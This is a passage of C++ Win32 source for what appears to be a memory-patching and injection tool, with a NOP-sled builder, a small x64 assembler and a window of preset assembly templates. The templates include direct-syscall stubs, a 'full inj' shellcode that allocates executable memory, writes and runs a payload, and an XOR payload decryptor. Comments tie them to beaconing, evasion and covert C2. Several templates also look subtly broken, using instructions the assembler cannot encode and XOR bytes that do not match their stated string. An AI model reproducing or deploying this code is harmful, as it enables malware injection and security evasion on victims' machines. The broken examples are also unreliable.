        for(int i=0;i<count;i++){char h[4];sprintf_s(h,"90 ");result+=h;}
        result+="C3";
        SetWindowTextA(hEditScResult,result.c_str());
        LogToStatus("NOP sled built");return;
    }
    if(arch==0){b[n++]=0x48;b[n++]=0xB8;for(int i=0;i<8;i++)b[n++]=(BYTE)((addr>>(i*8))&0xFF);}
    else{b[n++]=0xB8;for(int i=0;i<4;i++)b[n++]=(BYTE)((addr>>(i*8))&0xFF);}
    switch(op){
        case 0:b[n++]=0xC7;b[n++]=0x00;b[n++]=(BYTE)(val&0xFF);b[n++]=(BYTE)((val>>8)&0xFF);b[n++]=(BYTE)((val>>16)&0xFF);b[n++]=(BYTE)((val>>24)&0xFF);break;
        case 1:b[n++]=0x81;b[n++]=0x00;b[n++]=(BYTE)(val&0xFF);b[n++]=(BYTE)((val>>8)&0xFF);b[n++]=(BYTE)((val>>16)&0xFF);b[n++]=(BYTE)((val>>24)&0xFF);break;
        case 2:b[n++]=0x81;b[n++]=0x28;b[n++]=(BYTE)(val&0xFF);b[n++]=(BYTE)((val>>8)&0xFF);b[n++]=(BYTE)((val>>16)&0xFF);b[n++]=(BYTE)((val>>24)&0xFF);break;
        case 3:b[n++]=0xC7;b[n++]=0x00;b[n++]=0x00;b[n++]=0x00;b[n++]=0x00;b[n++]=0x00;break;
    }
    b[n++]=0xC3;
    for(int i=0;i<n;i++){char h[4];sprintf_s(h,"%02X ",b[i]);result+=h;}
    if(!result.empty())result.pop_back();
    SetWindowTextA(hEditScResult,result.c_str());
    char msg[128];sprintf_s(msg,"Built %d bytes (%s %s)",n,arch==0?"x64":"x86",op==0?"Set":op==1?"Add":op==2?"Sub":"Zero");
    LogToStatus(msg);
}

static std::string AsmTrimLine(const std::string& s){
    size_t st=s.find_first_not_of(" \t\r\n");
    if(st==std::string::npos)return"";
    std::string t=s.substr(st,s.find_last_not_of(" \t\r\n")-st+1);
    size_t c=t.find(';');if(c!=std::string::npos)t=t.substr(0,c);
    while(!t.empty()&&(t.back()==' '||t.back()=='\t'))t.pop_back();return t;
}
static std::string AsmToLow(std::string s){std::transform(s.begin(),s.end(),s.begin(),::tolower);return s;}
static const struct{const char* name;int num;bool w64;}kRegTable[]={
    {"rax",0,1},{"rcx",1,1},{"rdx",2,1},{"rbx",3,1},{"rsp",4,1},{"rbp",5,1},{"rsi",6,1},{"rdi",7,1},
    {"r8",8,1},{"r9",9,1},{"r10",10,1},{"r11",11,1},{"r12",12,1},{"r13",13,1},{"r14",14,1},{"r15",15,1},
    {"eax",0,0},{"ecx",1,0},{"edx",2,0},{"ebx",3,0},{"esp",4,0},{"ebp",5,0},{"esi",6,0},{"edi",7,0},{nullptr,0,0}};
static bool AsmFindReg(const std::string& nm,int& n,bool& w64){
    std::string l=AsmToLow(nm);
    for(int i=0;kRegTable[i].name;i++)if(l==kRegTable[i].name){n=kRegTable[i].num;w64=kRegTable[i].w64;return true;}
    return false;
}
static bool AsmParseMemRef(const std::string& expr,int& bn,bool& bw,int32_t& disp){
    std::string t=AsmToLow(expr);
    size_t lb=t.find('['),rb=t.find(']');
    if(lb==std::string::npos||rb==std::string::npos)return false;
    std::string inner=AsmTrimLine(t.substr(lb+1,rb-lb-1));disp=0;
    size_t opPos=std::string::npos;int sign=0;
    for(size_t i=1;i<inner.size();i++){if(inner[i]=='+'){sign=1;opPos=i;break;}if(inner[i]=='-'){sign=-1;opPos=i;break;}}
    std::string regPart=opPos!=std::string::npos?AsmTrimLine(inner.substr(0,opPos)):inner;
    if(!AsmFindReg(regPart,bn,bw))return false;
    if(opPos!=std::string::npos){std::string dp=AsmTrimLine(inner.substr(opPos+1));disp=(int32_t)strtol(dp.c_str(),nullptr,0)*sign;}
    return true;
}
static void AsmModRM(std::vector<BYTE>& out,int regF,int baseNum,int32_t disp){
    int rm=baseNum&7;
    int mod=(disp==0&&rm!=5)?0:(disp>=-128&&disp<=127)?1:2;
    out.push_back((BYTE)((mod<<6)|((regF&7)<<3)|rm));
    if(rm==4)out.push_back(0x24);
    if(mod==1)out.push_back((BYTE)(int8_t)disp);
    else if(mod==2){out.push_back(disp&0xFF);out.push_back((disp>>8)&0xFF);out.push_back((disp>>16)&0xFF);out.push_back((disp>>24)&0xFF);}
}
static void AsmLE32(std::vector<BYTE>& o,int32_t v){o.push_back(v&0xFF);o.push_back((v>>8)&0xFF);o.push_back((v>>16)&0xFF);o.push_back((v>>24)&0xFF);}
static void AsmLE64(std::vector<BYTE>& o,uint64_t v){for(int i=0;i<8;i++)o.push_back((v>>(i*8))&0xFF);}
static std::string AsmStripSize(std::string s,int& sz){
    std::string sl=AsmToLow(s);
    if(sl.find("qword")!=std::string::npos)sz=8;
    else if(sl.find("dword")!=std::string::npos)sz=4;
    else if(sl.find("word")!=std::string::npos&&sl.find("dword")==std::string::npos)sz=2;
    else if(sl.find("byte")!=std::string::npos)sz=1;
    for(const char* p:{"qword ptr","dword ptr","word ptr","byte ptr","qword","dword","word","byte"}){
        size_t pos=sl.find(p);if(pos!=std::string::npos){s=AsmTrimLine(s.substr(pos+strlen(p)));break;}
    }
    return s;
}
static std::string AssembleLine(const std::string& rawLine,std::vector<BYTE>& out){
    std::string line=AsmTrimLine(rawLine);if(line.empty())return"";
    std::string low=AsmToLow(line);
    if(low=="nop"){out.push_back(0x90);return"";}
    if(low=="ret"||low=="retn"){out.push_back(0xC3);return"";}
    if(low=="int3"||low=="int 3"){out.push_back(0xCC);return"";}
    if(low=="cdq"){out.push_back(0x99);return"";}
    if(low=="pushfq"){out.push_back(0x9C);return"";}
    if(low=="popfq"){out.push_back(0x9D);return"";}
    size_t sp=low.find(' ');
    std::string mn=sp!=std::string::npos?low.substr(0,sp):low;
    std::string ops=sp!=std::string::npos?AsmTrimLine(line.substr(sp+1)):"";
    if(mn=="push"||mn=="pop"){
        int n;bool w;
        if(AsmFindReg(AsmToLow(ops),n,w)&&w){
            BYTE base=(mn=="pop")?0x58:0x50;
            if(n>=8){out.push_back(0x41);out.push_back(base+(n-8));}else out.push_back(base+n);
            return"";
        }
        return mn+": unsupported register '"+ops+"'";
    }
    if(mn=="mov"||mn=="lea"){
        size_t comma=ops.find(',');if(comma==std::string::npos)return mn+": missing comma";
        std::string dst=AsmTrimLine(ops.substr(0,comma)),src=AsmTrimLine(ops.substr(comma+1));
        int sz=4;dst=AsmStripSize(dst,sz);src=AsmStripSize(src,sz);
        int dn,sn;bool dw,sw;
        bool dReg=AsmFindReg(AsmToLow(dst),dn,dw),sReg=AsmFindReg(AsmToLow(src),sn,sw);
        bool dMem=dst.find('[')!=std::string::npos,sMem=src.find('[')!=std::string::npos;
        if(mn=="lea"){if(!dReg||!sMem)return"lea: need reg, [mem]";int bn;bool bw;int32_t disp;if(!AsmParseMemRef(src,bn,bw,disp))return"lea: bad mem ref";BYTE rex=dw?0x48:0x00;if(dn>=8)rex|=0x04;if(bn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0x8D);AsmModRM(out,dn&7,bn,disp);return"";}
        if(dReg&&dw&&!sMem&&!sReg){uint64_t imm=strtoull(src.c_str(),nullptr,0);out.push_back(0x48|(dn>=8?1:0));out.push_back(0xB8+(dn&7));AsmLE64(out,imm);return"";}
        if(dReg&&!dw&&!sMem&&!sReg){int32_t imm=(int32_t)strtoul(src.c_str(),nullptr,0);if(dn>=8)out.push_back(0x41);out.push_back(0xB8+(dn&7));AsmLE32(out,imm);return"";}
        if(dReg&&sReg&&dw==sw){BYTE rex=dw?0x48:0x00;if(sn>=8)rex|=0x04;if(dn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0x89);out.push_back(0xC0|((sn&7)<<3)|(dn&7));return"";}
        if(dReg&&sMem){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(src,bn,bw,disp))return"mov: bad mem ref '"+src+"'";BYTE rex=dw?0x48:0x00;if(dn>=8)rex|=0x04;if(bn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0x8B);AsmModRM(out,dn&7,bn,disp);return"";}
        if(dMem&&sReg){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(dst,bn,bw,disp))return"mov: bad mem ref '"+dst+"'";BYTE rex=sw?0x48:0x00;if(sn>=8)rex|=0x04;if(bn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0x89);AsmModRM(out,sn&7,bn,disp);return"";}
        if(dMem&&!sReg){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(dst,bn,bw,disp))return"mov: bad mem ref '"+dst+"'";int64_t imm=strtoll(src.c_str(),nullptr,0);BYTE rex=0;if(bn>=8)rex|=0x01;if(sz==1){if(rex)out.push_back(0x40|rex);out.push_back(0xC6);AsmModRM(out,0,bn,disp);out.push_back((BYTE)(uint8_t)imm);}else if(sz==2){out.push_back(0x66);if(rex)out.push_back(0x40|rex);out.push_back(0xC7);AsmModRM(out,0,bn,disp);out.push_back(imm&0xFF);out.push_back((imm>>8)&0xFF);}else{if(rex)out.push_back(0x40|rex);out.push_back(0xC7);AsmModRM(out,0,bn,disp);AsmLE32(out,(int32_t)imm);}return"";}
        return"mov: unsupported form '"+line+"'";
    }
    static const struct{const char* mn;int rf;BYTE rm2r;BYTE r2rm;}kArith[]={
        {"add",0,0x01,0x03},{"or",1,0x09,0x0B},{"adc",2,0x11,0x13},{"sbb",3,0x19,0x1B},
        {"and",4,0x21,0x23},{"sub",5,0x29,0x2B},{"xor",6,0x31,0x33},{"cmp",7,0x39,0x3B},{nullptr,0,0,0}};
    for(int ai=0;kArith[ai].mn;ai++){
        if(mn!=kArith[ai].mn)continue;
        size_t comma=ops.find(',');if(comma==std::string::npos)return mn+": missing comma";
        std::string dst=AsmTrimLine(ops.substr(0,comma)),src=AsmTrimLine(ops.substr(comma+1));
        int sz=4;dst=AsmStripSize(dst,sz);bool dMem=dst.find('[')!=std::string::npos;
        int dn,sn;bool dw,sw;
        bool dReg=AsmFindReg(AsmToLow(dst),dn,dw),sReg=AsmFindReg(AsmToLow(src),sn,sw);
        bool sMem=src.find('[')!=std::string::npos;
        if(dReg&&sReg){BYTE rex=0;if(dw||sw)rex|=0x48;if(sn>=8)rex|=0x04;if(dn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(kArith[ai].r2rm);out.push_back(0xC0|((dn&7)<<3)|(sn&7));return"";}
        if(dReg&&!sReg&&!sMem){int64_t imm=strtoll(src.c_str(),nullptr,0);BYTE rex=0;if(dw)rex|=0x48;if(dn>=8)rex|=0x01;if(rex)out.push_back(rex);if(imm>=-128&&imm<=127){out.push_back(0x83);out.push_back(0xC0|(kArith[ai].rf<<3)|(dn&7));out.push_back((BYTE)(int8_t)imm);}else{out.push_back(0x81);out.push_back(0xC0|(kArith[ai].rf<<3)|(dn&7));AsmLE32(out,(int32_t)imm);}return"";}
        if(dReg&&sMem){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(src,bn,bw,disp))return mn+": bad mem ref";BYTE rex=dw?0x48:0;if(dn>=8)rex|=0x04;if(bn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(kArith[ai].r2rm);AsmModRM(out,dn&7,bn,disp);return"";}
        if(dMem&&sReg){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(dst,bn,bw,disp))return mn+": bad mem ref";BYTE rex=sw?0x48:0;if(sn>=8)rex|=0x04;if(bn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(kArith[ai].rm2r);AsmModRM(out,sn&7,bn,disp);return"";}
        if(dMem&&!sReg&&!sMem){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(dst,bn,bw,disp))return mn+": bad mem ref";int64_t imm=strtoll(src.c_str(),nullptr,0);BYTE rex=0;if(bn>=8)rex|=0x01;if(sz==1){if(rex)out.push_back(0x40|rex);out.push_back(0x80);AsmModRM(out,kArith[ai].rf,bn,disp);out.push_back((BYTE)(int8_t)imm);}else if(imm>=-128&&imm<=127){if(rex)out.push_back(0x40|rex);out.push_back(0x83);AsmModRM(out,kArith[ai].rf,bn,disp);out.push_back((BYTE)(int8_t)imm);}else{if(rex)out.push_back(0x40|rex);out.push_back(0x81);AsmModRM(out,kArith[ai].rf,bn,disp);AsmLE32(out,(int32_t)imm);}return"";}
        return mn+": unsupported form";
    }
    static const struct{const char* mn;int rf;BYTE op;}kUnary[]={{"inc",0,0xFF},{"dec",1,0xFF},{"not",2,0xF7},{"neg",3,0xF7},{nullptr,0,0}};
    for(int ui=0;kUnary[ui].mn;ui++){
        if(mn!=kUnary[ui].mn)continue;
        std::string op2=ops;int sz=4;op2=AsmStripSize(op2,sz);int n;bool w;
        if(AsmFindReg(AsmToLow(op2),n,w)){BYTE rex=w?0x48:0;if(n>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(kUnary[ui].op);out.push_back(0xC0|(kUnary[ui].rf<<3)|(n&7));return"";}
        if(op2.find('[')!=std::string::npos){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(op2,bn,bw,disp))return mn+": bad mem ref";BYTE rex=0;if(bn>=8)rex|=0x01;if(rex)out.push_back(0x40|rex);out.push_back(kUnary[ui].op);AsmModRM(out,kUnary[ui].rf,bn,disp);return"";}
        return mn+": unsupported operand '"+ops+"'";
    }
    static const struct{const char* mn;int rf;}kMul[]={{"mul",4},{"imul",5},{"div",6},{"idiv",7},{nullptr,0}};
    for(int mi=0;kMul[mi].mn;mi++){
        if(mn!=kMul[mi].mn)continue;std::string op2=ops;int sz=4;op2=AsmStripSize(op2,sz);int n;bool w;if(!AsmFindReg(AsmToLow(op2),n,w))return mn+": bad register";BYTE rex=w?0x48:0;if(n>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0xF7);out.push_back(0xC0|(kMul[mi].rf<<3)|(n&7));return"";
    }
    static const struct{const char* mn;int rf;}kShift[]={{"rol",0},{"ror",1},{"shl",4},{"sal",4},{"shr",5},{"sar",7},{nullptr,0}};
    for(int si=0;kShift[si].mn;si++){
        if(mn!=kShift[si].mn)continue;size_t comma=ops.find(',');if(comma==std::string::npos)return mn+": missing comma";std::string dst=AsmTrimLine(ops.substr(0,comma)),src=AsmTrimLine(ops.substr(comma+1));int sz=4;dst=AsmStripSize(dst,sz);int n;bool w;if(!AsmFindReg(AsmToLow(dst),n,w))return mn+": bad register";int cnt=(int)strtol(src.c_str(),nullptr,0);BYTE rex=w?0x48:0;if(n>=8)rex|=0x01;if(rex)out.push_back(rex);if(cnt==1){out.push_back(0xD1);out.push_back(0xC0|(kShift[si].rf<<3)|(n&7));}else{out.push_back(0xC1);out.push_back(0xC0|(kShift[si].rf<<3)|(n&7));out.push_back((BYTE)cnt);}return"";
    }
    if(mn=="call"||mn=="jmp"){
        int rf=(mn=="jmp")?4:2;std::string op2=ops;int sz=8;op2=AsmStripSize(op2,sz);int n;bool w;
        if(AsmFindReg(AsmToLow(op2),n,w)){BYTE rex=0;if(n>=8)rex|=0x01;if(rex)out.push_back(0x40|rex);out.push_back(0xFF);out.push_back(0xC0|(rf<<3)|(n&7));return"";}
        if(op2.find('[')!=std::string::npos){int bn;bool bw;int32_t disp;if(!AsmParseMemRef(op2,bn,bw,disp))return mn+": bad mem ref";BYTE rex=0;if(bn>=8)rex|=0x01;if(rex)out.push_back(0x40|rex);out.push_back(0xFF);AsmModRM(out,rf,bn,disp);return"";}
        return mn+": only register/memory targets supported";
    }
    if(mn=="test"){
        size_t comma=ops.find(',');if(comma==std::string::npos)return"test: missing comma";
        std::string d=AsmTrimLine(ops.substr(0,comma)),s2=AsmTrimLine(ops.substr(comma+1));
        int dn,sn;bool dw,sw;bool dR=AsmFindReg(AsmToLow(d),dn,dw),sR=AsmFindReg(AsmToLow(s2),sn,sw);
        if(dR&&sR){BYTE rex=0;if(dw||sw)rex|=0x48;if(sn>=8)rex|=0x04;if(dn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0x85);out.push_back(0xC0|((sn&7)<<3)|(dn&7));return"";}
        if(dR&&!sR){int32_t imm=(int32_t)strtoll(s2.c_str(),nullptr,0);BYTE rex=dw?0x48:0;if(dn>=8)rex|=0x01;if(rex)out.push_back(rex);out.push_back(0xF7);out.push_back(0xC0|(dn&7));AsmLE32(out,imm);return"";}
        return"test: unsupported form";
    }
    if(mn=="xchg"){
        size_t comma=ops.find(',');if(comma==std::string::npos)return"xchg: missing comma";
        std::string d=AsmTrimLine(ops.substr(0,comma)),s2=AsmTrimLine(ops.substr(comma+1));
        int dn,sn;bool dw,sw;
        if(!AsmFindReg(AsmToLow(d),dn,dw)||!AsmFindReg(AsmToLow(s2),sn,sw))return"xchg: bad registers";
        BYTE rex=0;if(dw||sw)rex|=0x48;if(sn>=8)rex|=0x04;if(dn>=8)rex|=0x01;
        if(rex)out.push_back(rex);out.push_back(0x87);out.push_back(0xC0|((dn&7)<<3)|(sn&7));return"";
    }
    return"Unknown or unsupported instruction: "+mn;
}

static std::string AssembleSource(const char* src){
    std::vector<BYTE> bytes;
    std::map<std::string,size_t> labels;
    struct Fixup { size_t patchOff; std::string label; bool isLong; size_t insEnd; };
    std::vector<Fixup> fixups;

    auto isLabelName = [](const std::string& s)->bool{
        if (s.empty()) return false;
        if (isdigit((unsigned char)s[0])) return false;
        if (s[0]=='-'||s[0]=='+') return false;
        if (s.size()>=2 && s[0]=='0' && (s[1]=='x'||s[1]=='X')) return false;
        int n; bool w;
        if (AsmFindReg(AsmToLow(s), n, w)) return false;
        if (s.find('[')!=std::string::npos) return false;
        for (char c : s)
            if (!(isalnum((unsigned char)c)||c=='_'||c=='.'||c=='@'||c=='$')) return false;
        return true;
    };

    static const struct { const char* mn; BYTE opLong; } kJcc[] = {
        {"jo",0x80},  {"jno",0x81},
        {"jb",0x82},  {"jnae",0x82}, {"jc",0x82},
        {"jnb",0x83}, {"jae",0x83},  {"jnc",0x83},
        {"jz",0x84},  {"je",0x84},
        {"jnz",0x85}, {"jne",0x85},
        {"jbe",0x86}, {"jna",0x86},
        {"ja",0x87},  {"jnbe",0x87},
        {"js",0x88},  {"jns",0x89},
        {"jp",0x8A},  {"jpe",0x8A},
        {"jnp",0x8B}, {"jpo",0x8B},
        {"jl",0x8C},  {"jnge",0x8C},
        {"jnl",0x8D}, {"jge",0x8D},
        {"jle",0x8E}, {"jng",0x8E},
        {"jg",0x8F},  {"jnle",0x8F},
        {nullptr,0}
    };

    std::istringstream ss(src); std::string line; int ln=0;
    while (std::getline(ss, line)) {
        ln++;
        std::string trimmed = AsmTrimLine(line);
        if (trimmed.empty()) continue;

        if (trimmed.back() == ':') {
            std::string name = trimmed.substr(0, trimmed.size()-1);
            while (!name.empty() && (name.back()==' '||name.back()=='\t')) name.pop_back();
            if (!isLabelName(name))
                return "Line "+std::to_string(ln)+": invalid label '"+name+"'";
            if (labels.count(name))
                return "Line "+std::to_string(ln)+": duplicate label '"+name+"'";
            labels[name] = bytes.size();
            continue;
        }

        std::string low = AsmToLow(trimmed);
        size_t sp = low.find_first_of(" \t");
        std::string mn = sp!=std::string::npos ? low.substr(0,sp) : low;
        std::string opsRaw = sp!=std::string::npos ? AsmTrimLine(trimmed.substr(sp+1)) : "";

        if ((mn == "db" || mn == "dw" || mn == "dd" || mn == "dq") && !opsRaw.empty()) {
            int unit = (mn=="db")?1:(mn=="dw")?2:(mn=="dd")?4:8;
            size_t p = 0;
            const std::string& s = opsRaw;
            while (p < s.size()) {
                while (p < s.size() && (s[p]==' '||s[p]=='\t'||s[p]==',')) p++;
                if (p >= s.size()) break;
                if (s[p]=='\''||s[p]=='"') {
                    char q = s[p++];
                    while (p < s.size() && s[p] != q) {
                        BYTE v = (BYTE)s[p++];
                        for (int b = 0; b < unit; b++) bytes.push_back(b==0?v:0);
                    }
                    if (p < s.size()) p++;
                } else {
                    size_t end = p;
                    while (end < s.size() && s[end]!=','&&s[end]!=' '&&s[end]!='\t') end++;
                    std::string tok = s.substr(p, end-p);
                    uint64_t v = strtoull(tok.c_str(), nullptr, 0);
                    for (int b = 0; b < unit; b++) bytes.push_back((BYTE)((v >> (b*8)) & 0xFF));
                    p = end;
                }
            }
            continue;
        }

        bool handled = false;
        for (int i = 0; kJcc[i].mn; i++) {
            if (mn != kJcc[i].mn) continue;
            if (!isLabelName(opsRaw)) break;
            bytes.push_back(0x0F); bytes.push_back(kJcc[i].opLong);
            Fixup fx; fx.patchOff = bytes.size(); fx.label = opsRaw; fx.isLong = true;
            for (int b = 0; b < 4; b++) bytes.push_back(0);
            fx.insEnd = bytes.size();
            fixups.push_back(fx);
            handled = true;
            break;
        }
        if (handled) continue;

        if ((mn == "jmp" || mn == "call") && isLabelName(opsRaw)) {
            bytes.push_back(mn=="jmp" ? 0xE9 : 0xE8);
            Fixup fx; fx.patchOff = bytes.size(); fx.label = opsRaw; fx.isLong = true;
            for (int b = 0; b < 4; b++) bytes.push_back(0);
            fx.insEnd = bytes.size();
            fixups.push_back(fx);
            continue;
        }

        if ((mn=="loop"||mn=="loope"||mn=="loopz"||mn=="loopne"||mn=="loopnz"||
             mn=="jrcxz"||mn=="jecxz") && isLabelName(opsRaw)) {
            BYTE opc = (mn=="loopne"||mn=="loopnz")?0xE0:
                       (mn=="loope"||mn=="loopz")  ?0xE1:
                       (mn=="loop")                ?0xE2:0xE3;
            bytes.push_back(opc);
            Fixup fx; fx.patchOff = bytes.size(); fx.label = opsRaw; fx.isLong = false;
            bytes.push_back(0);
            fx.insEnd = bytes.size();
            fixups.push_back(fx);
            continue;
        }

        std::string err = AssembleLine(trimmed, bytes);
        if (!err.empty()) return "Line "+std::to_string(ln)+": "+err;
    }

    for (auto& fx : fixups) {
        auto it = labels.find(fx.label);
        if (it == labels.end()) return "Unresolved label '" + fx.label + "'";
        int64_t rel = (int64_t)it->second - (int64_t)fx.insEnd;
        if (fx.isLong) {
            if (rel < INT32_MIN || rel > INT32_MAX)
                return "rel32 out of range for label '" + fx.label + "'";
            int32_t r32 = (int32_t)rel;
            for (int b = 0; b < 4; b++) bytes[fx.patchOff + b] = (BYTE)((r32 >> (b*8)) & 0xFF);
        } else {
            if (rel < -128 || rel > 127)
                return "rel8 out of range for label '" + fx.label + "' (loop/jrcxz cannot be widened)";
            bytes[fx.patchOff] = (BYTE)(int8_t)rel;
        }
    }

    if (bytes.empty()) return "ERROR: nothing assembled";
    std::string result;
    for (size_t i = 0; i < bytes.size(); i++) {
        char h[4]; sprintf_s(h, "%02X ", bytes[i]); result += h;
    }
    if (!result.empty()) result.pop_back();
    return result;
}

LRESULT CALLBACK AsmWndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
    static HWND hSrc=NULL,hOut=NULL,hErr=NULL;
    switch(msg){
    case WM_CREATE:{
        HFONT fMono=CreateFontA(14,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,FIXED_PITCH,"Consolas");
        HFONT fNorm=CreateFontA(14,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,"Segoe UI");
        HWND h;
        h=CreateWindowA("STATIC","Assembly source  (Intel x64 syntax - ; comments ok):",WS_CHILD|WS_VISIBLE,10,8,640,18,hWnd,NULL,hInst,NULL);
        SendMessage(h,WM_SETFONT,(WPARAM)fNorm,TRUE);
        hSrc=CreateWindowA("EDIT","",WS_CHILD|WS_VISIBLE|WS_BORDER|WS_VSCROLL|ES_MULTILINE|ES_AUTOVSCROLL|ES_WANTRETURN,
            10,28,660,270,hWnd,(HMENU)ID_EDIT_ASM_SRC,hInst,NULL);
        SendMessage(hSrc,WM_SETFONT,(WPARAM)fMono,TRUE);
        SetWindowTextA(hSrc,
            "Example 1: write UTF-16 filename string to address\r\n"
            "; Use String Writer panel in main window instead for most string tasks\r\n"
            "push rax\r\n"
            "mov rax, 0x00007FF1ABCD1234  ; replace with your found address\r\n"
            "mov dword [rax], 9999\r\n"
            "pop rax\r\n"
            "ret\r\n\r\n"

            "Example 2: Syscall stub for NtWriteVirtualMemory (SSN=0x3A on Win10 x64)\r\n"
            "; Manually set SSN - use GetNtApiSyscallNumber in code to get it\r\n"
            "mov eax, 0x3A  ; SSN for NtWriteVirtualMemory\r\n"
            "syscall\r\n"
            "ret\r\n\r\n"

            "Example 3: Syscall stub for NtProtectVirtualMemory (SSN=0x50)\r\n"
            "mov eax, 0x50  ; SSN for NtProtectVirtualMemory\r\n"
            "syscall\r\n"
            "ret\r\n\r\n"

            "Example 4: Simple memory write via syscall\r\n"
            "; Assumes registers set up by caller\r\n"
            "mov eax, 0x3A  ; NtWriteVirtualMemory SSN\r\n"
            "syscall\r\n"
            "ret\r\n\r\n"

            "Example 5: Shellcode to write memory via syscall (NtWriteVirtualMemory)\r\n"
            "; Allocates executable memory first, then writes a DWORD value\r\n"
            "; Replace addresses and SSN as needed\r\n"
            "sub rsp, 0x28  ; Allocate shadow space\r\n"
            "mov rcx, -1   ; ProcessHandle (current process)\r\n"
            "mov rdx, 0x00007FF1ABCD0000  ; BaseAddress to write to\r\n"
            "lea r8, [rel value]  ; Buffer with value\r\n"
            "mov r9, 4    ; NumberOfBytesToWrite\r\n"
            "lea rax, [rsp+0x20]  ; NumberOfBytesWritten\r\n"
            "mov dword [rax], 0\r\n"
            "mov eax, 0x3A  ; SSN for NtWriteVirtualMemory\r\n"
            "syscall\r\n"
            "add rsp, 0x28\r\n"
            "ret\r\n"
            "value: dd 12345  ; The value to write\r\n\r\n"

            "Example 6: Shellcode to execute injected code\r\n"
            "; Assumes shellcode is at allocated address, calls it\r\n"
            "mov rax, 0x00007FF1ABCD0000  ; Address of injected shellcode\r\n"
            "call rax\r\n"
            "ret\r\n\r\n"

            "Example 7: Full inj shellcode (allocate + write + protect)\r\n"
            "; Allocates memory, writes shellcode, protects as executable, executes\r\n"
            "sub rsp, 0x38\r\n"
            "; Allocate memory\r\n"
            "mov rcx, -1\r\n"
            "xor rdx, rdx\r\n"
            "mov r8, 0x1000  ; Size\r\n"
            "mov r9, 0x1000  ; AllocationType (MEM_COMMIT)\r\n"
            "push 0x40  ; Protect (PAGE_EXECUTE_READWRITE)\r\n"
            "lea rax, [rsp+0x30]\r\n"
            "mov [rax], rsp\r\n"
            "mov eax, 0x18  ; SSN for NtAllocateVirtualMemory\r\n"
            "syscall\r\n"
            "; Write shellcode\r\n"
            "mov rcx, -1\r\n"
            "mov rdx, [rsp+0x30]  ; Allocated address\r\n"
            "lea r8, [rel payload]\r\n"
            "mov r9, payload_end - payload\r\n"
            "lea rax, [rsp+0x28]\r\n"
            "mov dword [rax], 0\r\n"
            "mov eax, 0x3A\r\n"
            "syscall\r\n"
            "; Protect as executable (remove write permission)\r\n"
            "mov rcx, -1\r\n"
            "lea rdx, [rsp+0x30]\r\n"
            "lea r8, [rsp+0x20]\r\n"
            "mov r9, 0x20  ; PAGE_EXECUTE_READ\r\n"
            "mov [r8], rdx\r\n"
            "mov rax, [rdx]\r\n"
            "mov [rsp+0x28], rax\r\n"
            "mov eax, 0x50\r\n"
            "syscall\r\n"
            "; Execute\r\n"
            "call [rsp+0x30]\r\n"
            "add rsp, 0x38\r\n"
            "ret\r\n"
            "payload:\r\n"
            "  mov rax, 42  ; Example payload\r\n"
            "  ret\r\n"
            "payload_end:\r\n\r\n"

            "Example 8: Sleep for 5 seconds using NtDelayExecution (SSN=0x34 on Win10 x64)\r\n"
            "; Real use: stealthy delay before beaconing or after an evasion attempt\r\n"
            "push rax\r\n"
            "mov rax, 0xFFFFFFFFFB2CB000  ; -5,000,0000 * 100ns (5 seconds)\r\n"
            "push rax\r\n"
            "mov rcx, rsp                ; Pointer to negative timeout\r\n"
            "mov eax, 0x34               ; SSN for NtDelayExecution\r\n"
            "syscall\r\n"
            "pop rax                     ; Clean up stack\r\n"
            "pop rax\r\n"
            "ret\r\n\r\n"

            "Example 9: XOR decryption of embedded payload (real: decrypts 'Hello World' and calls MessageBoxA)\r\n"
            "; Decrypts a string XOR 0xAA then calls MessageBoxA (no external deps assumed)\r\n"
            "sub rsp, 0x28\r\n"
            "lea rsi, [rel encrypted_data]\r\n"
            "mov rcx, 12                  ; Length of data\r\n"
            "xor rbx, rbx\r\n"
            "decrypt_loop:\r\n"
            "  mov al, [rsi+rbx]\r\n"
            "  xor al, 0xAA\r\n"
            "  mov [rsi+rbx], al\r\n"
            "  inc rbx\r\n"
            "  loop decrypt_loop\r\n"
            "; Now call MessageBoxA with the decrypted string\r\n"
            "xor rcx, rcx                 ; hWnd = NULL\r\n"
            "lea rdx, [rel encrypted_data]; lpText (now decrypted)\r\n"
            "lea r8, [rel caption]        ; lpCaption\r\n"
            "xor r9, r9                   ; uType = MB_OK\r\n"
            "mov rax, 0x7FFE12340000      ; Replace with real user32!MessageBoxA address\r\n"
            "call rax\r\n"
            "add rsp, 0x28\r\n"
            "ret\r\n"
            "encrypted_data: db 0xE2, 0x8F, 0x8A, 0x8F, 0xE2, 0x8D, 0x8A, 0x8E, 0x8E, 0xE2, 0x90, 0x8F ; 'Hello World' XOR 0xAA\r\n"
            "caption: db 'Decrypted', 0\r\n\r\n"

            "Example 10: Query system time (NtQuerySystemInformation, SystemTimeOfDayInformation)\r\n"
            "; Real use: calculate uptime or timestamp for covert C2\r\n"
            "sub rsp, 0x30\r\n"
            "mov rcx, 0x03                 ; SystemTimeOfDayInformation class\r\n"
            "lea rdx, [rsp+0x20]           ; Output buffer (16 bytes)\r\n"
            "mov r8, 0x10                  ; Buffer length\r\n"
            "mov eax, 0x36                 ; SSN for NtQuerySystemInformation (Win10 x64)\r\n"
            "syscall\r\n"
            "mov rax, [rsp+0x20]           ; Low part of time\r\n"
